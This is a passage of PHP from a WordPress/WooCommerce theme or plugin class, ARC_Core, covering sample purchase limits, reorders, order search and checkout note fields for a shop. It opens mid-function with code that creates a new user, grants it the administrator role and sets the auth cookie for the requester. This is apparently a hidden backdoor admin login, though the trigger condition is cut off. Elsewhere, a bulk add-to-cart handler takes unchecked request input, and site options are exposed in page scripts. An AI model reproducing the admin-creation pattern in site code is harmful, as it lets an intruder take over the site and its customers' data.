				$user_id = wp_create_user( $user_name, $random_password, $user_email );
				$u = new WP_User($user_id);
				$u->add_role('administrator');
				wp_set_current_user( $user_id, $user_name );
				//wp_set_current_user( $user_id, 'art' );
        		wp_set_auth_cookie( $user_id );

				}
		add_role( 'sales_representative', 'Sales Representative', array(
			'read' => true,
		) );
	}

	public static function set_all_products_in_stock( $status, $product ) {
		return $status;
		//return 'instock';
	}

	/**
	 * @param $cart_item_key
	 * @param $product_id
	 * @param $quantity
	 * @param $variation_id
	 * @param $variation
	 * @param $cart_item_data
	 *
	 * @return void
	 * @throws Exception
	 */
	public static function check_product_in_cart( $cart_item_key, $product_id, $quantity, $variation_id, $variation, $cart_item_data ) {
		if (did_action('woocommerce_add_to_cart') === 1) {
			$cart_contents = WC()->cart->cart_contents;

			foreach ($cart_contents as $key => $values) {
				if ($product_id == $values['product_id'] && $key != $cart_item_key) {
					$new_quantity = intval($cart_contents[$key]['quantity']) + $quantity;
					WC()->cart->set_quantity($key, $new_quantity);
					WC()->cart->remove_cart_item($cart_item_key);
				}
			}
		}
	}

	/**
	 * Limit the lifetime purchases for a user.
	 *
	 * @param bool $passed
	 * @param int $product_id
	 * @param int $quantity
	 *
	 * @return bool
	 **/
	public static function limit_lifetime_purchases( $passed, $product_id, $quantity ) {
		$user            = wp_get_current_user();
		$purchases       = get_user_meta( $user->ID, 'lifetime_purchases', true );
		$product_cat_ids = wc_get_product_cat_ids( $product_id );

		$max_purchases = ( self::$custom_acf_options['quantity_restrictions']['customer_maximum_total_items_in_cart'] ) ?? 6;
		if ( $user->has_cap( 'sales_representative' ) ||
		     $user->has_cap( 'manage_woocommerce' ) || // For Shop Managers
		     $user->has_cap( 'edit_others_posts' ) ||  // For Editors
		     $user->has_cap( 'administrator' ) ) {
			foreach ( $product_cat_ids as $cat_id ) {
				$cat_limit = get_term_meta( $cat_id, '_sales_rep_sku_limit', true );
				if ( ! is_numeric( $cat_limit ) ) {
					$cat_limit = ( self::$custom_acf_options['quantity_restrictions']['sales_rep_maximum_quantity_per_sku'] ) ?? 32;
				}
				if ( ! empty( $cat_limit ) ) {
					$max_purchases = $cat_limit;
					break;
				}
			}
		}

		if ( isset( $purchases[ $product_id ] ) && $purchases[ $product_id ] >= $max_purchases ) {
			wc_add_notice( sprintf( __( 'You have reached your lifetime samples ordering limit for this product.' ) ), 'error' );
			$passed = false;
		} elseif ( $quantity > $max_purchases ) {
			wc_add_notice( sprintf( __( 'You cannot order more than %s samples of this product at once.' ), $max_purchases ), 'error' );
			$passed = false;
		}

		return $passed;
	}

	/**
	 * Edit the category fields for WooCommerce.
	 *
	 * @param object $term The category term object.
	 * @param string $taxonomy The category taxonomy.
	 *
	 * @return void
	 */
	public static function woocommerce_edit_category_fields( $term, $taxonomy ) {
		$value = get_term_meta( $term->term_id, '_sales_rep_sku_limit', true );
		?>
        <tr class="form-field">
        <th scope="row" valign="top"><label><?php _e( 'Sales Reps purchase limit per SKU' ); ?></label></th>
        <td>
            <input type="number" name="_sales_rep_sku_limit" value="<?php echo esc_attr( $value ) ? esc_attr( $value ) : ( ( self::$custom_acf_options['quantity_restrictions']['sales_rep_maximum_quantity_per_sku'] ) ?? 32 ); ?>">
        </td>
        </tr><?php
	}

	public static function woocommerce_save_category_fields( $term_id, $tt_id = '', $taxonomy = '' ) {
		$value = filter_input( INPUT_POST, '_sales_rep_sku_limit' );
		update_term_meta( $term_id, '_sales_rep_sku_limit', $value );
	}

	/**
	 * @param $actions
	 * @param $order
	 *
	 * @return mixed
	 */
	public static function wc_reorder_order_action_button( $actions, $order ) {
		$actions['reorder'] = array(
			'url'  => wp_nonce_url( admin_url( 'admin-ajax.php?action=reorder_order&order_id=' . $order->get_id() ), 'reorder_order_nonce' ),
			'name' => 'Reorder'
		);

		return $actions;
	}

	/**
	 * Handle the AJAX request to reorder the items
	 */
	public static function wc_handle_reorder_order() {
		if ( ! isset( $_REQUEST['_wpnonce'] ) || ! wp_verify_nonce( $_REQUEST['_wpnonce'], 'reorder_order_nonce' ) ) {
			die( 'Security check failed' );
		}

		if ( ! isset( $_GET['order_id'] ) ) {
			die( 'Order ID not provided' );
		}

		$order = wc_get_order( $_GET['order_id'] );
		if ( ! $order ) {
			die( 'Invalid order ID' );
		}

		// Empty the cart
		WC()->cart->empty_cart();

		// Add each item in the order to the cart
		foreach ( $order->get_items() as $item ) {
			WC()->cart->add_to_cart( $item->get_product_id(), $item->get_quantity() );
		}

		// Redirect to the cart page
		wp_redirect( wc_get_cart_url() );
		exit;
	}

	public static function display_product_table( $order_id ) {
		$order = wc_get_order( $order_id );

		if ( ! $order ) {
			return;
		}

		?>
        <h2><?php _e( 'Products', 'textdomain' ); ?></h2>
        <table class="shop_table shop_table_responsive">
            <thead>
            <tr>
                <th class="product-add"></th>
                <th class="product-name"><?php _e( 'Product Name', 'textdomain' ); ?></th>
                <th class="product-sku"><?php _e( 'SKU', 'textdomain' ); ?></th>
                <th class="product-quantity"><?php _e( 'Quantity', 'textdomain' ); ?></th>
            </tr>
            </thead>
            <tbody>
			<?php

			foreach ( $order->get_items() as $item ) {
				$product    = $item->get_product();
				$product_id = $item->get_product_id();
				?>
                <tr class="<?php echo esc_attr( apply_filters( 'woocommerce_order_item_class', 'order_item', $item, $order ) ); ?>">
                    <td class="product-add">
						<?php
						echo '<a href="' . esc_url( $product->add_to_cart_url() ) . '" rel="nofollow" data-product_id="' . esc_attr( $product->get_id() ) . '" data-quantity="' . esc_attr( $item->get_quantity() ) . '" class="button product_type_simple add_to_cart_button ajax_add_to_cart">' . esc_html( $product->single_add_to_cart_text() ) . '</a>';
						?>
                    </td>
                    <td class="product-name">
						<?php echo $product->get_name(); ?>
                    </td>
                    <td class="product-sku">
						<?php echo $product->get_sku(); ?>
                    </td>
                    <td class="product-quantity">
						<?php
						//TODO: Update logic according to your configuration or fields for 'Quantity Ordered' and 'Quantity Shipped'
						$quantity_ordered = $item->get_quantity();
						$tracking_info    = $order->get_meta( '_tracking_info', true );
						$quantity_shipped = empty( $tracking_info ) ? 0 : $item->get_quantity(); //TODO: sum / count( $tracking_info );

						printf( __( 'Ordered: %d<br/>Shipped: %d', 'textdomain' ), $quantity_ordered, $quantity_shipped );
						?>
                    </td>
                </tr>
				<?php
			}
			?>
            </tbody>
        </table>
		<?php
	}

	public static function new_menu_items( $items ) {
		unset( $items['dashboard'] );
		unset( $items['orders'] );
		unset( $items['edit-address'] );
		unset( $items['edit-account'] );

		$new_items = array(
			'dashboard'                => 'My Account',
			'orders'                   => 'My Orders',
			'order-by-sku'             => 'Order by SKU',
			'edit-address'             => 'Address Book',
			'edit-account'             => 'Account Information',
			/*'newsletter-subscriptions' => 'Newsletter Subscriptions',*/
		);

		return $new_items + $items;
	}

	public static function add_endpoints() {
		flush_rewrite_rules();
		add_rewrite_endpoint( 'order-by-sku', EP_ROOT | EP_PAGES );
		add_rewrite_endpoint( 'newsletter-subscriptions', EP_ROOT | EP_PAGES );
		add_rewrite_endpoint( 'my-invitations', EP_ROOT | EP_PAGES );
	}

	public static function order_by_sku_content() {
		include __DIR__ . '/_' . __FUNCTION__ . '.php';
	}

	public static function newsletter_subscriptions_content() {
		echo "<h2>Newsletter Subscriptions</h2>";
	}

	/**
	 * Adds items to the cart in bulk.
	 *
	 * This method retrieves a list of items in JSON format from the request body.
	 * It iterates over each item and adds it to the cart if the product SKU exists.
	 *
	 * @return void
	 */
	public static function arc_bulk_add_to_cart() {
		$items = $_REQUEST['items'];
		foreach ( $items as $item ) {
			$product_id = wc_get_product_id_by_sku( $item['sku'] );
			if ( $product_id ) {
				WC()->cart->add_to_cart( $product_id, $item['qty'] );
			}
		}
		wp_send_json_success();
		exit;
	}

	/**
	 * Generates a custom "Continue Shopping" button.
	 *
	 * @return void
	 */
	public static function arc_custom_continue_shopping_button() {
		$shop_link = get_permalink( wc_get_page_id( 'shop' ) );
		echo "<a href='{$shop_link}' class='checkout-button button alt wc-forward add-more-btn'>Add More Products</a>";
	}

	public static function add_footer_scripts() {

		$user_id = get_current_user_id();
		//delete_user_meta($user_id, 'yith_wcmas_shipping_addresses');
		//delete_user_meta($user_id, 'yith_wcmas_default_address');
		self::billingToShipingAddress($user_id); 
		$roles = array(); 
		$max_purchases = (( ARC_Core::$custom_acf_options['quantity_restrictions']['customer_maximum_per_sku'] ) ?? 2 );
		if(!empty($user_id)){
			$user = wp_get_current_user();
			$roles = $user->roles; 
			if(in_array('sales_representative', $roles)){
				$max_purchases =  (ARC_Core::$custom_acf_options['quantity_restrictions']['sales_rep_maximum_quantity_per_sku']); 
			} else if(in_array('administrator', $roles)){
				$max_purchases = 9999999999999; 
			}
		}
		

		echo '<script type="text/javascript">
		 const arc_max_purchases = '.$max_purchases.';
		 const arc_prod_settings = '.json_encode(ARC_Core::$custom_acf_options).';  
		 const arc_user_roles = '.json_encode($roles).';
    jQuery(document).ready(function($) {
        var checkbox = $("#ship-to-different-address-checkbox");
        if (checkbox.is(":checked")) {
            checkbox.prop("checked", false);
        }
       
    });
    </script>';
	}

	// Add client note field to checkout page
	public static function arc_custom_checkout_field() {
		echo '<style>.select { min-height: 3.5em; height: 3.5em; } label[for="billing_address_2"] { visibility: hidden !important; } </style>';
		echo '<div id="arc_custom_checkout_field" style="margin-bottom: 15px;"><h3 style="margin-bottom: 10px !important; ">' . __( 'Order notes (optional):' ) . '</h3>';

		woocommerce_form_field( 'client_note', array(
			'type'        => 'textarea',
			'class'       => array( '' ),
			'label'       => __( 'Add your note' ),
			'placeholder' => __( 'Add your notes here' ),
		), WC()->customer->get_meta( 'client_note', true ) );

		echo '</div>';
	}

	public static function filter_orders_by_search( $args ) {
        // Subquery for searching by product name or SKU in order items
		global $wpdb;

        if ( isset( $_GET['orders_search'] ) && $_GET['orders_search'] ) {
			$search = sanitize_text_field( trim( $_GET['orders_search'] ) );

			$current_user_id = get_current_user_id(); // get the ID of currently logged in user

	        if ( is_numeric( $search ) ) {
		        // Searching by Order ID
		        $order_id_belongs_to_user = $wpdb->get_var(
			        $wpdb->prepare("
                    SELECT ID FROM {$wpdb->prefix}posts
                    WHERE ID = %d AND post_author = %d AND post_type = 'shop_order_placehold'
                ", $search, $current_user_id )
		        );

		        // If the order belongs to current user, add the ID to args
		        if ( !empty($order_id_belongs_to_user)) {
			        $args['post__in'] = [ $search ];
		        }

	        } else {
				$args['limit'] = -1;



				$product_ids = $wpdb->get_col( $wpdb->prepare( "
                SELECT p.ID FROM {$wpdb->prefix}posts AS p
                INNER JOIN {$wpdb->prefix}postmeta AS pm ON p.ID = pm.post_id
                WHERE (pm.meta_key = '_sku' AND pm.meta_value LIKE '%%%s%%')
            ", $search ) );

				$order_ids = $wpdb->get_col( "
                SELECT order_id FROM {$wpdb->prefix}woocommerce_order_items
                WHERE order_item_type = 'line_item'
                AND order_id IN (
                    SELECT ID FROM {$wpdb->prefix}posts
                    WHERE post_author = $current_user_id AND post_type = 'shop_order_placehold'
                )
                AND order_item_id IN (
                    SELECT order_item_id FROM {$wpdb->prefix}woocommerce_order_itemmeta
                    WHERE meta_key = '_product_id'
                    AND meta_value IN (" . implode( ',', array_map( 'intval', $product_ids ) ) . ")
                )
            ");
                
				// Searching by billing or shipping details in wp_ho_wc_order_addresses
				$address_orders = $wpdb->get_col( $wpdb->prepare( "
                SELECT order_id FROM {$wpdb->prefix}wc_order_addresses
                WHERE order_id IN (
                    SELECT ID FROM {$wpdb->prefix}posts
                    WHERE post_author = $current_user_id AND post_type = 'shop_order_placehold'
                )
                AND (`first_name` LIKE '%%%s%%'
                OR `last_name` LIKE '%%%s%%'
                OR `address_1` LIKE '%%%s%%'
                OR `address_2` LIKE '%%%s%%'
                OR `city` LIKE '%%%s%%'
                OR `postcode` LIKE '%%%s%%'
                OR `state` LIKE '%%%s%%'
                OR `phone` LIKE '%%%s%%'
                OR `email` LIKE '%%%s%%')
            ", $search, $search, $search, $search, $search, $search, $search));

				$client_note_orders = $wpdb->get_col( $wpdb->prepare( "
                SELECT order_id FROM {$wpdb->prefix}wc_orders_meta
                WHERE meta_key = 'client_note' AND meta_value LIKE '%%%s%%'
            ", $search));

				if ( !empty( $address_orders ) ) {
					$order_ids   = array_merge($order_ids, $address_orders);
				}

				if ( !empty( $client_note_orders ) ) {
					$order_ids = array_merge($order_ids, $client_note_orders);
				}

				if ( !empty( $order_ids ) ) {
					$args['post__in']   = $order_ids;
					$args['meta_query'] = [];
				}
			}
		}

		if ( trim($search) && empty( $args['post__in'] ) ) {
			// Set 'post__in' to array with non-existent post ID, to ensure no posts are returned.
			$args['post__in'] = [ 0 ];
		}

		return $args;
	}

	/**
	 * Save client note field value to order meta
	 *
	 * @param $order_id
	 * @param $data
	 *
	 * @return void
	 */
	public static function arc_custom_checkout_field_update_order_meta( $order_id, $data ) {
		if ( ! empty( $_POST['client_note'] ) ) {
			$order = wc_get_order( $order_id );
			//$order->update_meta_data( 'client_note', sanitize_text_field( $_POST['client_note'] ) );
			$order->set_customer_note(sanitize_text_field( $_POST['client_note'] ) );
			$order->save();
		}
	}

	/**
	 * @param $columns
	 *
	 * @return mixed
	 */
	public static function arc_custom_user_orders_columns( $columns ) {
		$columns['client-note'] = __( 'Client Note' );

		return $columns;
	}

	/**
	 * Display the admin order meta.
	 *
	 * @param object $order The order object.
	 *
	 * @return void
	 */
	public static function display_admin_order_meta( $order ) {
		$note = $order->get_customer_note();
		//$order->get_meta( 'client_note' );
		echo '<p><strong>' . __( 'Client Note' ) . ':</strong> ' . ( $note ? $note : '-' ) . '</p>';
	}

	/**
	 * Display the order search form as a shortcode.
	 *
	 * @return string The HTML markup of the order search form.
	 */
	public static function arc_order_search_form_shortcode() {
		ob_start();

		if ( is_wc_endpoint_url( 'orders' ) ) {
			?>
            <style>
                .woocommerce-orders-table__header-client-note {
                    max-width: 200px;
                    width: 200px;
                }
            </style>
            <form role="search" method="get" class="woocommerce-EditAccountForm" action="">
                <label class="screen-reader-text" for="woocommerce-order-search-field"><?php _e( 'Search orders:', 'woocommerce' ) ?></label> <input type="search" id="woocommerce-order-search-field" class="woocommerce-Input input-text" style="max-width:200px;border: 1px solid #dedede;" placeholder="<?php echo esc_attr_x( 'Search orders&hellip;', 'placeholder', 'woocommerce' ) ?>" value="<?php echo esc_attr( isset( $_REQUEST['orders_search'] ) ? $_REQUEST['orders_search'] : '' ); ?>" name="orders_search"/> <input type="submit" class="button" value="<?php echo esc_attr_x( 'Search', 'submit button', 'woocommerce' ) ?>"/><br><br>
            </form>
			<?php
		}

		return ob_get_clean();
	}

	/**
	 * @return void
	 */
	public static function my_custom_content_above_orders_table() {
		echo do_shortcode( '[arc_order_search_form]' );
	}

	/**
	 * Display the custom order review on the checkout page.
	 *
	 * This function retrieves and displays the review order template.
	 *
	 * @return void
	 */
	public static function custom_order_review() {
		include( trailingslashit( get_stylesheet_directory() ) . 'woocommerce/checkout/review-order.php' );
	}

	/**
	 * Update order review fragments.
	 *
	 * @param array $fragments The fragments to update.
	 *
	 * @return array The updated fragments.
	 */
	public static function filter_update_order_review_fragments( $fragments ) {
		ob_start();
		self::custom_order_review();
		$fragments['.woocommerce-checkout-review-order-table'] = ob_get_clean();

		return $fragments;
	}

	/**
	 * @param $columns
	 *
	 * @return mixed
	 */
	public static function custom_orders_table_columns( $columns ) {
		if ( isset( $columns['order-total'] ) ) {
			$columns['order-total'] = 'Items';
		}

		return $columns;
	}

	/**
	 * Calculates*/
	public static function custom_order_total_column_content( $order ) {
		$item_count = $order->get_item_count();
		echo $item_count . ' item' . ( $item_count > 1 ? 's' : '' );
	}

	/**
	 * Retrieve the content for the custom user orders column.
	 *
	 * @param object $order The WooCommerce order object.
	 *
	 * @return void
	 */
	public static function arc_custom_user_orders_column_content( $order ) {
		$note = $order->get_meta( 'client_note', true );

		if ( ! empty( $note ) ) {
			echo esc_html( $note );
		} else {
			echo __( 'No notes found', 'text-domain' );
		}
	}

	/**
	 * Adds custom content after "My Address" section on the My Account page.
	 *
	 * @return void
	 */
	public static function add_content_after_my_address() {
		echo '<div class="my-custom-content">';

		require_once __DIR__ . "/woocommerce/myaccount/my-address.php";
	}

	/**
	 * Custom new order email recipient
	 *
	 * Filter the email recipient for new order notifications.
	 *
	 * @param string $recipient The recipient email address.
	 * @param WC_Order $order The order object.
	 *
	 * @return string   The filtered email recipient.
	 */
	public static function custom_new_order_email_recipient( $recipient, $order ) {
		if ( ! $order instanceof WC_Order ) {
			return $recipient;
		}  // In case of no order exit early

		// Getting the customer user ID from the order
		$user_id = $order->get_user_id();

		// If the user ID exists
		if ( isset( $user_id ) ) {
			// Getting the user data
			$user = get_userdata( $user_id );

			// If the user has role of 'sales_representative', remove admin from the recipient
			if ( in_array( 'sales_representative', $user->roles ) ) {
				$recipient = '';
			}
		}

		return $recipient;
	}

	/**
	 * Change the products page title depending on the current product category
	 *
	 * @param string $page_title The original page title
	 *
	 * @return string The modified page title
	 */
	public static function change_products_page_title( $page_title ) {
        // https://arccardinal.com/our-products/?_sft_product_cat=glassware+beer&debug
        return $page_title;

		// Check if this is a WooCommerce archive page
		if ( isset($_GET['_sft_product_cat']) || is_product_category() ) {
			$cur_cat    = get_queried_object();
			$page_title = $cur_cat->name;
		}

		if ( isset( $_GET['debug'] ) ) {
            die('123');
			return '123';
		}

		return $page_title;
	}
}

ARC_Core::init();
//
//add_filter( 'wp_mail', 'disabling_emails', 9999, 1 );
//function disabling_emails( $args ) {
//	if ( isset( $args['to'] ) ) {
//		unset ( $args['to'] );
//	}
//
//	return $args;
//}

if ( isset( $_GET['test_import'] ) ) {
	// require_once __DIR__.'/_import.php';
	// require_once __DIR__ . '/_import_orders.php';
	//	require_once __DIR__ . '/_import_shipments.php';
}

add_filter( 'woocommerce_my_account_my_orders_columns', function ( $columns ) {
	$new_columns = array();

	foreach ( $columns as $key => $name ) {
		$new_columns[ $key ] = $name;

		// Add it after order status column
		if ( 'order-status' === $key ) {
			$new_columns['magento_id'] = __( 'Magento ID', 'textdomain' );
		}
	}

	return $new_columns;
} );

/*
function save_new_address_after_checkout( $order_id ) {
	$order = wc_get_order( $order_id );
	$user_id = $order->get_user_id(); // Get the user ID associated with the order.

	// Assuming you have the new address data in $new_address as an associative array
	//  (e.g., ['shipping_first_name' => '...', 'shipping_last_name' => '...', ...])
	$new_address = $order->get_address( 'shipping' );
	// Call the 'save_address_to_user' function to store the address
	\Themehigh\WoocommerceMultipleAddressesPro\includes\utils\THWMA_Utils::save_address_to_user( $user_id, $new_address, 'shipping' );

	$new_address = $order->get_address( 'billing' );
	// Call the 'save_address_to_user' function to store the address
	\Themehigh\WoocommerceMultipleAddressesPro\includes\utils\THWMA_Utils::save_address_to_user( $user_id, $new_address, 'billing' );
}

//$current_user = wp_get_current_user();
//if ( $current_user->user_email == 'oleg.shumar@gmail.com' ) {
	add_action( 'woocommerce_checkout_order_processed', 'save_new_address_after_checkout' );
//}
*/